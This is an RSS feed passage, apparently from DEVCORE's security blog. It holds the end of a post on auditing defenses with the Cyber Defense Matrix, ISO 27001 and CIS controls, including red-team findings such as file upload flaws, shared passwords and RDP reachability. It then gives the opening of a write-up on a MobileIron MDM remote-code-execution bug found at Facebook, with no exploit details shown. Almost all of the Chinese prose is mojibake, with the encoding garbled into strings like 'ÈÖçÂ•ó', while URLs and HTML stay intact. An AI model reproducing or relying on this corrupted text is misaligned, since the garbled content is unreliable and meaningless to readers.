  &lt;li&gt;ÈÖçÂ•óÊé™ÊñΩÁöÑ‰∏çÂÆåÊï¥Ôºö‰πüÂ∞±ÊòØ„ÄåÁ®ãÂ∫è„ÄçÂèä„ÄåÊµÅÁ®ã„Äç‰∏äÁöÑ‰∏çË∂≥ÔºåÂÅáË®≠ÊüêË≥áÂÆâË®≠ÂÇôÂèØ‰ª•ÂÅµÊ∏¨Âà∞Áï∞Â∏∏Ë°åÁÇ∫ÔºåË≥áÂÆâ‰∫∫Âì°Â¶Ç‰ΩïÂàÜËæ®ÈÄôÊòØÊîªÊìäË°åÁÇ∫ÈÇÑÊòØÂì°Â∑•ÂÖßÈÉ®Ê≠£Â∏∏Ë°åÁÇ∫ÔºüÂ§ö‰πÖÂÖßË¶ÅÂèäÊôÇÂõûÊáâÈÄ≤Ë°åËôïÁêÜ„ÄÅÂ§ö‰πÖË¶ÅÁôºÂãïÈëëË≠òÔºü‰∏ÄÊó¶‰∏äËø∞ÁöÑ„ÄåÁ®ãÂ∫è„ÄçÂèä„ÄåÊµÅÁ®ã„ÄçÊ≤íÊúâÂÆöÁæ©Ê∏ÖÊ•öÔºåÁ∏±‰ΩøË®≠ÂÇôÊú¨Ë∫´ÊòØÊúâÊïàÁöÑÔºåÁµÑÁπî‰ªçÁÑ∂ÊúÉÂõ†ÁÇ∫ÂõûÊáâÊôÇÈñìÈÅéÊÖ¢ÔºåÂ∞éËá¥ÊîªÊìäËÄÖÂÖ•‰æµÊàêÂäü„ÄÇ
&lt;img src=&quot;/assets/img/blog/20201013/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;Áõ§ÈªûÂêÑÂ±§Ê¨°ÁöÑÂÆàÂÇôÁØÑÂúç&quot;&gt;Áõ§ÈªûÂêÑÂ±§Ê¨°ÁöÑÂÆàÂÇôÁØÑÂúç&lt;/h2&gt;

&lt;p&gt;ÈÇ£È∫ºË¶ÅÂ¶Ç‰ΩïÊîπÂñÑÈÄôÂÖ©Á®Æ‰∏ç‰Ω≥ÁöÑÈò≤Á¶¶ÁãÄÊÖãÔºüÊàëÂÄëÂèØ‰ª•ÂñÆÁç®‰ΩøÁî® CDM ‰æÜË©ï‰º∞ÊäÄË°ìÂ±§ÁöÑÂÆàÂÇôÁØÑÂúçÊòØÂê¶Ë∂≥Â§†Ôºå‰πüÂèØ‰ª•‰ΩøÁî®ÂÆÉ‰æÜ‰ΩúÁÇ∫Á®ãÂ∫è„ÄÅÊµÅÁ®ãÂèäÊäÄË°ìÂ±§ÁöÑË∑®ÈöéÂ±§ÁöÑÁõ§ÈªûÔºõ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CDM (Cyber Defense Matrix) ÊòØ OWASP ÁöÑ‰∏ÄÂÄãÂ∞àÊ°àÔºåÁî±‰∏ÄÂÄã 5x5 ÁöÑÁü©Èô£ÊâÄÊßãÊàê„ÄÇÊ©´Ëª∏ÊòØ NIST CSF ÁöÑ‰∫îÂ§ßÈ°ûÂà•ÔºåËÄåÁ∏±Ëª∏ÂâáÊòØË≥áÁî¢Áõ§ÈªûÂ∏∏Ë¶ãÁöÑÂàÜÈ°ûÔºõÁµÑÁπîÂèØ‰ª•Âà©Áî®ÈÄôÂÄãÁü©Èô£‰æÜÁõ§Èªû‰ºÅÊ•≠ Technology View Âª∫ÊßãÁöÑÈò≤Á¶¶Ë®≠ÂÇôÔºåÊõ¥Á≤æÊ∫ñÁöÑÁ¢∫Ë™çÈúÄË¶Å‰øùË≠∑ÁöÑË≥áÁî¢ÊòØÂê¶Âú® NIST CSF ÁöÑÊØèÂÄãÈ°ûÂà•ÈÉΩÊúâÂ∞çÊáâÁöÑÊé™ÊñΩ„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‰ª• ISO 27001 ‰ΩúÁÇ∫‰æãÂ≠êÔºåÂ∞áÂÖ∂Êú¨ÊñáÁöÑË¶ÅÊ±ÇÂèäÈôÑÈåÑ A ÁöÑÊéßÂà∂Êé™ÊñΩÔºåÂ∞çÊáâÂà∞ CDM ‰∏äÔºåÈÄ≤ËÄåÁõ§Èªû ISO 27001 Âú®ÁµÑÁπîÁöÑÁ®ãÂ∫èÈù¢ÊâÄËÉΩÊ∂µËìãÁöÑÁØÑÂúç„ÄÇË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºå‰∏çÂêåÁµÑÁπîÂú®Áõ§ÈªûÊôÇÔºåÊúÉÁî¢Áîü‰∏çÂêåÁöÑÂ∞çÊáâÁµêÊûúÔºåÈÄôÊ≠£ÊòØÈÄèÈÅé CDM ‰æÜÊ™¢Ë¶ñÁöÑÊÑèÁæ©ÊâÄÂú®Ôºõ‰æãÂ¶ÇÂú®Áõ§Èªû„ÄåA.7.2.2 Ë≥áË®äÂÆâÂÖ®Ë™çÁü•„ÄÅÊïôËÇ≤ÂèäË®ìÁ∑¥„ÄçÊôÇÔºå‰ºÅÊ•≠Ë¶ÅÊÄùËÄÉÂ∞çÊñº‰∫∫Âì°ÁöÑÊïôËÇ≤Ë®ìÁ∑¥ÊòØÂê¶Ê∂µËìãÂà∞ NIST CSF ÁöÑ‰∫îÂ§ßÈ°ûÂà•ÔºåÈÇÑÊòØÂè™ÂåÖÂê´‰∫∫Âì°ÊÑèË≠òÁöÑË®ìÁ∑¥ÔºõÂè¶Â§ñ‰ª•„ÄåA.6.2.2 ÈÅ†Ë∑ùÂ∑•‰Ωú„ÄçÁöÑÈò≤Ë≠∑Ê©üÂà∂ÔºåÈô§‰∫ÜÈáùÂ∞çÁ∂≤Ë∑ØÂ±§ÂèäÊáâÁî®Á®ãÂºè‰øùË≠∑Â§ñÔºåÁÆ°ÁêÜÁ®ãÂ∫èÊòØÂê¶‰πüÂåÖÂê´ÈÅ†Ë∑ùÂ∑•‰ΩúÁöÑË≥áÊñôÂèäË®≠ÂÇôË¶ÅÊ±ÇÔºü&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•ËëóÔºåÂæÄ‰∏ã‰∏ÄÂ±§ (Procedure Layer)Ôºå‰πüÂ∞á‰ºÅÊ•≠ÁèæÊúâÁöÑÊéßÂà∂Êé™ÊñΩÔºåÂ∞çÊáâÂà∞ CDM ‰∏≠„ÄÇÈÄôÈÇä‰ª• CIS CSC ÁÇ∫‰æãÔºåÊ∑∫ËóçËâ≤ÁöÑÈÉ®‰ªΩÂ±¨ÊñºÂü∫Êú¨ÂûãÁöÑÊéßÂà∂Áæ§ÁµÑ„ÄÅÁÅ∞Ëâ≤ÈÉ®ÂàÜÁÇ∫Âü∫Á§éÂûãÊéßÂà∂Áæ§ÁµÑÔºåÁµÑÁπîÂûãÁöÑÊéßÂà∂Áæ§ÁµÑÂõ†ÁÇ∫ÊØîËºÉÂÅèÂêëÁ®ãÂ∫èÈù¢ÔºåÂõ†Ê≠§ÊØîËºÉÈõ£ÂñÆÁç®Ê≠∏Â±¨Âú®ÁâπÂÆöÁöÑ CDM ÂçÄÂ°ä‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÈÄèÈÅéÁúüÂØ¶ÁöÑÂ®ÅËÑÖË£úË∂≥Ë≥áÂÆâÁ≠ñÁï•ÁöÑ‰∏çË∂≥&quot;&gt;ÈÄèÈÅéÁúüÂØ¶ÁöÑÂ®ÅËÑÖÔºåË£úË∂≥Ë≥áÂÆâÁ≠ñÁï•ÁöÑ‰∏çË∂≥&lt;/h2&gt;

&lt;p&gt;Âú®ÈÄèÈÅé CDM Áõ§ÈªûÂÆå Procedure Layer Âèä Process Layer ÂæåÔºå‰ºÅÊ•≠Êé•ËëóÂèØ‰ª•ÈÄèÈÅéË≥áÂÆâ‰∫ãÊïÖ„ÄÅÂ®ÅËÑÖÊÉÖË≥á„ÄÅÁ¥ÖÈöäÊºîÁ∑¥ÊàñÊ®°Êì¨ÂÖ•‰æµÊîªÊìäÂ∑•ÂÖ∑ (BAS) Á≠âË≤ºËøëÁúüÂØ¶Â®ÅËÑÖÁöÑÊúçÂãôÊàñÂ∑•ÂÖ∑Ôºå‰æÜÊÄùËÄÉË≥áÂÆâÁ≠ñÁï•ÁöÑ‰∏çË∂≥‰πãËôï„ÄÇÈÄôÈÇäÊàëÂÄë‰ª•‰∏ÄÂÄãÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÈÉ®ÂàÜÊàêÊûú‰ΩúÁÇ∫Ê°à‰æãÔºå‰æÜË≤´Á©øÊú¨ÁØáÊñáÁ´†ÁöÑÊáâÁî®„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôÂÄãÊ°à‰æã‰∏≠ÔºåÊàëÂÄëÁ¥ÑÁï•ÂèØ‰ª•ÁôºÁèæÂπæÂÄãÂïèÈ°åÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á®ãÂºèÊí∞ÂØ´‰∏çÂ§†ÂÆâÂÖ®Ôºö‰ª•Ëá¥Â≠òÂú®‰ªªÊÑèÊ™îÊ°à‰∏äÂÇ≥ÁöÑÊºèÊ¥û„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏çÂêåÁ≥ªÁµ±Èñì‰ΩøÁî®ÂÖ±Áî®Â∏≥ËôüÂØÜÁ¢ºÔºöÂ∞éËá¥ÊíûÂ∫´ÊîªÊìäÂèØ‰ª•ÊàêÂäüÔºåËÄåÁõ£ÊéßÊ©üÂà∂ÊàñÁµÑÊÖãÁÆ°ÁêÜÈ°ØÁÑ∂Êú™ÁôºÊèÆ‰ΩúÁî®„ÄÇ&lt;/li&gt;
  &lt;li&gt;Êú™‰æùÁÖßË≥áÊñôÊ©üÊïèÊÄßÈÄ≤Ë°åÁ∂≤ÊÆµÂçÄÈöîÔºöÂ∞çÂ§ñÊúçÂãôÁ∂≤ÊÆµÂèØ‰ª•ÈÄèÈÅé RDP ÈÄ£Á∑öËá≥ core zone„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁâπÊ¨äÂ∏≥ËôüËàáÂ≠òÂèñÊéßÂà∂Êú™ÈÄ≤Ë°åÈóúËÅØÂàÜÊûêÔºöËá¥ÂèØ‰ª•‰ΩøÁî® backup Â∏≥ËôüÁôªÂÖ• AD Á∂≤ÂüüÊéßÂà∂Âô®„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‰∏äËø∞ÁöÑ 4 ÂÄãÈ†ÖÁõÆÔºåÊòØÁõ¥Ë¶∫Âú®Áõ§ÈªûÊôÇÂèØËÉΩÊÉ≥Âà∞ÁöÑÁñèÊºèÈ†ÖÁõÆ„ÄÇ‰ΩÜË¶ÅÊÄéÈ∫ºÁ¢∫Ë™çÈÇÑÊúâÂÖ∂‰ªñÊ†πÂõ† (root cause) ÊòØ‰ºÅÊ•≠Ê≤íÊÄùËÄÉÂà∞ÁöÑÂë¢ÔºüÈÄôÊôÇÂÄôÂ∞±ÂèØ‰ª•Âà©Áî®Â∑≤Áü•ÁöÑÊ®ôÊ∫ñÂèäÊ°ÜÊû∂ÔºåÊê≠ÈÖçÂÖàÂâçÁõ§ÈªûÂ•ΩÁöÑÊéßÂà∂È†ÖÁõÆÔºå‰æÜÊõ¥ÁÇ∫Âë®Âª∂ÁöÑÊÄùËÄÉÁõÆÂâçÈÇÑÂèØ‰ª•Âº∑ÂåñÁöÑÊéßÂà∂Êé™ÊñΩÔºõÂ¶ÇÊûú‰ºÅÊ•≠ÁöÑË≥áÊ∫êÊúâÈôêÔºåÁîöËá≥ÂèØ‰ª•ÂèÉËÄÉ CIS CSC Â∞çÊñºÂÑ™ÂÖàÊ¨äÁöÑÂª∫Ë≠∞È†ÜÂ∫èÔºåÂÖàÁ¢∫Ë™çÁµÑÁπîÂØ¶‰ΩúÁæ§ÁµÑ (Implementation Group) ÔºåÂÜç‰æùÂü∫Êú¨Âûã„ÄÅÂü∫Á§éÂûãÂèäÁµÑÁπîÂûãÔºåË®ÇÂÆöÁü≠„ÄÅ‰∏≠„ÄÅÈï∑ÊúüË®àÁï´ÂèäÊäïÊîæË≥áÊ∫êÔºåÊúâÁõÆÊ®ôÁöÑÊîπÂñÑÈò≤Á¶¶ËÉΩËÄê„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÔºåÂèØ‰ª•Â∞á‰∏äÂúñÊâæÂá∫ Procedure Layer ÁöÑÊéßÂà∂È†ÖÁõÆÔºåÂ∞çÊáâÂà∞ Process Layer ÁöÑÁõ§ÈªûÁµêÊûúÔºåÊ™¢Ë¶ñÊµÅÁ®ã‰∏äÂ∞çÊáâÁöÑ‰ΩúÊ≥ï„ÄÇ‰ª• „Äå14.1„ÄÅ‰æùÊìöÊïèÊÑüÊÄßÁ∂≤Ë∑ØÈÄ≤Ë°åÂçÄÈöî„ÄçÁÇ∫‰æãÔºåÂéªË©ï‰º∞ ISO 27001 ‰∏≠„ÄåA.6.2.2 ÈÅ†Ë∑ùÂ∑•‰Ωú„ÄçÁöÑË¶ÅÊ±Ç‰∏äÔºåÂú®Ë®≠ÂÇô„ÄÅÊáâÁî®Á®ãÂºè„ÄÅÁ∂≤Ë∑Ø„ÄÅË≥áÊñôÂèä‰ΩøÁî®ËÄÖÔºåÊòØÂê¶ÈÉΩÊúâÂÅöÂ•ΩÁ∂≤Ë∑ØÂçÄÈöîÔºõÊàñÊòØ„Äå6.3 ÈñãÂïüÊõ¥Ë©≥Áõ°ÁöÑÊó•Ë™å„ÄçÔºåË©ï‰º∞Âú® ISO 27001 ‰∏≠„ÄåA.16.1.5„ÄçÂ∞çÊñºË≥áË®äÂÆâÂÖ®‰∫ãÊïÖÁöÑÂõûÊáâ‰∏äÔºåÂú®ÂÅµÊ∏¨„ÄÅÂõûÊáâË∑üÂæ©Âéü‰∏äÔºåÊòØÂê¶ÈÉΩÊúâÂ∞çÊáâÁöÑÁ®ãÂ∫èÂèØ‰ª•ÊîØÊåÅÔºåÁõ£ÊéßÂà∞ÁôºÂá∫ÁöÑÂëäË≠¶„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄèÈÅéÊú¨ÁØáÁöÑÊñπÊ≥ïË´ñÂèØ‰ª•ÂæûÊäÄË°ì„ÄÅÁ®ãÂ∫è„ÄÅÊµÅÁ®ãÂà∞È¢®Èö™ÔºåËÆì‰∏çÂêåÈöéÂ±§ÁöÑË≥áÂÆâÂæûÊ•≠‰∫∫Âì°Êúâ‰∏ÄËá¥ÊÄßÁöÑÊ∫ùÈÄöÊñπÂºè„ÄÇÊàëÂÄëÂ∏åÊúõË≥áÂÆâÁ≠ñÁï•Â∞çÊñº‰ºÅÊ•≠ÊòØ‰∏ÄÂÄãÁúüÊ≠£ÂèØË¢´ÂØ¶‰Ωú„ÄÅÂª∫Á´ãÂá∫Áü≠„ÄÅ‰∏≠„ÄÅÈï∑ÊúüÁõÆÊ®ôÁöÑÂãôÂØ¶‰ΩúÁÇ∫ÔºåËÄåÈùûÂè™ÊòØ‰∏ÄÂÄãÁµÑÁπîÊ≤ªÁêÜ‰∏≠ÁöÑ‰∏ÄÂÄãÈ´òÊ∑±ÂêçË©û„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/</link>
                <guid>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards</guid>
                <pubDate>Tue, 13 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ÁúãÊàëÂ¶Ç‰ΩïÂÜç‰∏ÄÊ¨°Èß≠ÈÄ≤ FacebookÔºå‰∏ÄÂÄãÂú® MobileIron MDM ‰∏äÁöÑÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÊºèÊ¥û!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âó®! Â•Ω‰πÖ‰∏çË¶ãÔºåÈÄôÊòØÊàëÂú®‰ªäÂπ¥Âπ¥ÂàùÁöÑÁ†îÁ©∂ÔºåË¨õËø∞Â¶Ç‰ΩïÂ∞ãÊâæ‰∏ÄÊ¨æÁü•ÂêçË°åÂãïË£ùÁΩÆÁÆ°ÁêÜÁî¢ÂìÅÁöÑÊºèÊ¥ûÔºå‰∏¶ÁπûÈÅéÂ±§Â±§‰øùË≠∑ÂèñÂæóÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÁöÑÊïÖ‰∫ã! ÂÖ∂‰∏≠ÁöÑÊºèÊ¥ûÁ∂ìÂõûÂ†±ÂæåÂú®ÂÖ≠ÊúàÁî±ÂÆòÊñπÈáãÂá∫‰øÆË£úÁ®ãÂºè‰∏¶Á∑äÊÄ•ÈÄöÁü•‰ªñÂÄëÁöÑÂÆ¢Êà∂ÔºåËÄåÊàëÂÄë‰πüÂú®‰øÆË£úÁ®ãÂºèÈáãÂá∫ 15 Â§©ÂæåÁôºÁèæ Facebook ‰∏¶Êú™ÂèäÊôÇÊõ¥Êñ∞ÔºåÂõ†Ê≠§ÈÄèÈÅéÊºèÊ¥ûÂèñÂæó‰º∫ÊúçÂô®Ê¨äÈôê‰∏¶ÂõûÂ†±Áµ¶ Facebook!&lt;/p&gt;

&lt;p&gt;Ê≠§‰ªΩÁ†îÁ©∂ÂêåÊôÇÁôºË°®Êñº &lt;a href=&quot;https://hitcon.org/2020/&quot;&gt;HITCON 2020&lt;/a&gt;Ôºå‰Ω†ÂèØ‰ª•Âæû&lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;ÈÄôË£°&lt;/a&gt;ÂèñÂæóÈÄôÊ¨°ÊºîË¨õÁöÑÊäïÂΩ±Áâá!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ë∫´ÁÇ∫‰∏ÄÂÄãÂ∞àÊ•≠ÁöÑÁ¥ÖÈöäÔºåÊàëÂÄë‰∏ÄÁõ¥Âú®Â∞ãÊâæËëóÊõ¥Âø´ÈÄüÂèØ‰ª•ÂæûÂ§ñÈÉ®ÈÄ≤ÂÖ•‰ºÅÊ•≠ÂÖßÁ∂≤ÁöÑÊúÄ‰Ω≥ÈÄîÂæë! Â¶ÇÂêåÊàëÂÄëÂéªÂπ¥Âú® &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; ÁôºË°®ÁöÑÁ†îÁ©∂ÔºåSSL VPN ÁêÜÊâÄÁï∂ÁÑ∂ÊúÉÊîæÂú®Â§ñÈÉ®Á∂≤Ë∑ØÔºåÊàêÁÇ∫‰øùË≠∑ËëóÁ∂≤Ë∑ØÂÆâÂÖ®„ÄÅ‰ΩøÂì°Â∑•ÈÄ≤ÂÖ•ÂÖßÈÉ®Á∂≤Ë∑ØÁöÑÂü∫Á§éË®≠ÊñΩÔºåËÄåÁï∂‰Ω†ÊâÄ‰ø°‰ªª„ÄÅ‰∏¶‰∏îÁî®‰æÜ‰øùË≠∑‰Ω†ÂÆâÂÖ®ÁöÑË®≠ÂÇô‰∏çÂÜçÂÆâÂÖ®‰∫ÜÔºå‰Ω†Ë©≤ÊÄéÈ∫ºËæ¶?&lt;/p&gt;

&lt;p&gt;Áî±Ê≠§ÁÇ∫ÁôºÊÉ≥ÔºåÊàëÂÄëÈñãÂßãÂ∞ãÊâæËëóÊúâÊ≤íÊúâÊñ∞ÁöÑ‰ºÅÊ•≠Á∂≤Ë∑ØËÑÜÂº±ÈªûÂèØÁï∂ÊàêÊàëÂÄëÁ¥ÖÈöäÊîªÊìäÊª≤ÈÄè‰ºÅÊ•≠ÁöÑÂàùÂßãÈÄ≤ÂÖ•ÈªûÔºåÂú®Ë™øÊü•ÁöÑÈÅéÁ®ã‰∏≠ÊàëÂÄëÂ∞ç MDM/UEM ÈñãÂßãÁî¢Áîü‰∫ÜËààË∂£ÔºåËÄåÈÄôÁØáÊñáÁ´†Â∞±ÊòØÂæûÊ≠§ÁôºÂ±ïÂá∫‰æÜÁöÑÁ†îÁ©∂ÊàêÊûú!&lt;/p&gt;

&lt;h2 id=&quot;‰ªÄÈ∫ºÊòØ-mdmuem-&quot;&gt;‰ªÄÈ∫ºÊòØ MDM/UEM ?&lt;/h2&gt;

&lt;p&gt;Mobile Device ManagementÔºåÁ∞°Á®± MDMÔºåÁ¥ÑÊòØÂú® 2012 Âπ¥ÈñìÔºåÂÄã‰∫∫ÊâãÊ©ü„ÄÅÂπ≥ÊùøË£ùÁΩÆÈñãÂßãËààËµ∑ÊôÇÔºåÁÇ∫‰∫Ü‰Ωø‰ºÅÊ•≠Êõ¥Â•ΩÁöÑÁÆ°ÁêÜÂì°Â∑•ÁöÑ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD Ë£ùÁΩÆ&lt;/a&gt;ÔºåÊáâÈÅãËÄåÁîüÁöÑË≥áÁî¢Áõ§ÈªûÁ≥ªÁµ±Ôºå‰ºÅÊ•≠ÂèØ‰ª•ÈÄèÈÅé MDM Áî¢ÂìÅÔºåÁÆ°ÁêÜÂì°Â∑•ÁöÑË°åÂãïË£ùÁΩÆÔºåÁ¢∫‰øùË£ùÁΩÆÂè™Âú®‰ø°‰ªªÁöÑÁí∞Â¢É„ÄÅÊîøÁ≠ñ‰∏ãÈÅãË°åÔºå‰πüÂèØ‰ª•Âæû‰∏≠ÂøÉÁöÑÁ´ØÈªû‰º∫ÊúçÂô®ÔºåÈáùÂ∞çÊâÄÊéßÂà∂ÁöÑÊâãÊ©üÔºåÈÉ®ÁΩ≤ÊáâÁî®Á®ãÂºè„ÄÅÂÆâË£ùÊÜëË≠âÁîöËá≥ÈÅ†Á´ØÊìçÊéß‰ª•ÁÆ°ÁêÜ‰ºÅÊ•≠Ë≥áÁî¢ÔºåÊõ¥ÂèØ‰ª•Âú®Ë£ùÁΩÆÈÅ∫Â§±ÊôÇÔºåÈÄèÈÅé MDM ÈÅ†Á´Ø‰∏äÈéñÔºåÊàñÊòØÊäπÈô§Êï¥Âè∞Ë£ùÁΩÆË≥áÊñôÈÅîÂà∞‰ºÅÊ•≠Èö±ÁßÅ‰∏çÂ§ñÊºèÁöÑÁõÆÁöÑ!&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) ÂâáÁÇ∫ËøëÂπæÂπ¥‰æÜÊõ¥Êñ∞ÁöÑ‰∏ÄÂÄãË°ìË™ûÔºåÂÖ∂Ê†∏ÂøÉÁöÜÁÇ∫Ë°åÂãïË£ùÁΩÆÁöÑÁÆ°ÁêÜÔºåÂè™ÊòØ UEM ‰∏ÄË©ûÂåÖÂê´Êõ¥Âª£ÁöÑË£ùÁΩÆÂÆöÁæ©! ÊàëÂÄë‰ª•‰∏ãÁöÜÁî® MDM ‰∏ÄË©û‰æÜ‰ª£ÊåáÂêåÈ°ûÁî¢ÂìÅ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÊàëÂÄëÁöÑÁõÆÊ®ô&quot;&gt;ÊàëÂÄëÁöÑÁõÆÊ®ô&lt;/h2&gt;

&lt;p&gt;MDM ‰ΩúÁÇ∫‰∏ÄÂÄã‰∏≠ÂøÉÂåñÁöÑÁ´ØÈªûÊéßÂà∂Á≥ªÁµ±ÔºåÂèØ‰ª•ÊéßÂà∂„ÄÅ‰∏¶ÁÆ°ÁêÜÊóó‰∏ãÊâÄÊúâÂì°Â∑•ÂÄã‰∫∫Ë£ùÁΩÆ! Â∞çÊó•ÁõäÂ£ØÂ§ßÁöÑ‰ºÅÊ•≠‰æÜË™™ÔºåÁµïÂ∞çÊòØ‰∏ÄÂÄãÊúÄ‰Ω≥ÁöÑË≥áÁî¢Áõ§ÈªûÁî¢ÂìÅÔºåÁõ∏Â∞çÁöÑÔºåÂ∞çÈß≠ÂÆ¢‰æÜË™™‰πüÊòØ! ËÄåÁÇ∫‰∫ÜÁÆ°ÁêÜ‰æÜËá™‰∏ñÁïåÂêÑÂú∞ÁöÑÂì°Â∑•Ë£ùÁΩÆÈÄ£Á∑öÔºåMDM ÂèàÂã¢ÂøÖÂæóÊõùÈú≤Âú®Â§ñÁ∂≤„ÄÇ ‰∏ÄÂÄãÂèØ‰ª•„ÄåÁÆ°ÁêÜÂì°Â∑•Ë£ùÁΩÆ„ÄçÂèà„ÄåÊîæÁΩÆÂú®Â§ñÁ∂≤„ÄçÁöÑË®≠ÂÇôÔºåÈÄôÂ∞çÊàëÂÄëÁöÑÁ¥ÖÈöäÊºîÁ∑¥‰æÜË™™ÁÑ°ÁñëÊòØÊúÄÊ£íÁöÑÊª≤ÈÄèÁÆ°ÈÅì!&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÔºåÂæûÈÄôÂπæÂπ¥ÁöÑÂÆâÂÖ®Ë∂®Âã¢‰πü‰∏çÈõ£ÁôºÁèæ MDM ÈÄêÊº∏ÊàêÁÇ∫Èß≠ÂÆ¢„ÄÅAPT ÁµÑÁπîÁöÑÈ¶ñÈÅ∏ÁõÆÊ®ô! Ë™ò‰ΩøÂèóÂÆ≥ËÄÖÂêåÊÑèÊÉ°ÊÑèÁöÑ MDM ÊàêÁÇ∫‰Ω†Ë£ùÁΩÆÁöÑ C&amp;amp;C ‰º∫ÊúçÂô®ÔºåÊàñÊòØ‰πæËÑÜÂÖ•‰æµ‰ºÅÊ•≠ÊîæÁΩÆÂú®Â§ñÁ∂≤ÁöÑ MDM Ë®≠ÂÇôÔºåÂú®ÊâπÊ¨°Âú∞Ê¥æÈÄÅË°åÂãïË£ùÁΩÆÊú®È¶¨ÊÑüÊüìÊâÄÊúâ‰ºÅÊ•≠Âì°Â∑•ÊâãÊ©ü„ÄÅÈõªËÖ¶Ôºå‰ª•ÈÅîÂà∞ÈÄ≤‰∏ÄÊ≠•ÁöÑÊîªÊìä! ÈÄô‰∫õÈÉΩÂ∑≤ÊàêÁúüÔºåË©≥Á¥∞ÁöÑÂ†±ÂëäÂèØÂèÉÈñ± Cisco Talos ÂúòÈöäÊâÄÁôºË°®ÁöÑ &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let‚Äôs Hide This App&lt;/a&gt; ‰ª•Âèä CheckPoint CPR ÂúòÈöäÊâÄÁôºË°®ÁöÑ &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;ÂæûÂâçÈù¢ÁöÑÂπæÂÄãÊ°à‰æãÊàëÂÄëÂæóÁü• MDM Â∞çÊñº‰ºÅÊ•≠ÂÆâÂÖ®‰æÜË™™ÔºåÊòØ‰∏ÄÂÄãÂæàÂ•ΩÁöÑÂàáÂÖ•ÈªûÔºåÂõ†Ê≠§ÊàëÂÄëÈñãÂßãÁ†îÁ©∂Áõ∏ÈóúÁöÑÊîªÊìäÈù¢! ËÄåÂ∏ÇÈù¢‰∏ä MDM Âª†ÂïÜÊúâÈùûÂ∏∏Â§öÔºåÂêÑÂÄãÂ§ßÂª†Â¶Ç Microsoft„ÄÅIBM ÁîöËá≥ Apple ÈÉΩÊúâÊé®Âá∫Ëá™Â∑±ÁöÑ MDM Áî¢ÂìÅÔºåÊàëÂÄëË¶ÅÊåëÈÅ∏Âì™ÂÄãÈñãÂßãÊàêÁÇ∫ÊàëÂÄëÁöÑÁ†îÁ©∂Â∞çË±°Âë¢?&lt;/p&gt;

